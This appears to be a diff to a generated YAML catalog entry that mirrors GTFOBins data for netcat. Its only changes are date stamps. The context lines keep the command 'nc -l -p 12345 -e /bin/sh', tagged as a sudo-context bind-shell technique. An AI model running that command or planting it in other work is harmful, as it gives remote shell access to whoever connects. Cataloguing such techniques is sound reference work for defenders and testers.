@@ -14,7 +14,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: nc -l -p 12345 -e /bin/sh
   comment: This only works with netcat traditional.
@@ -32,7 +32,7 @@ source_data:
       context: sudo
     upstream_url: https://gtfobins.github.io/gtfobins/nc/
     upstream_version: acd5246
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: bind-shell
@@ -75,6 +75,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     GTFOBins: sha256:08a0a4c915c25f574030bc815b472c6f2639cb6ff3915485b32d175afb48ae7f
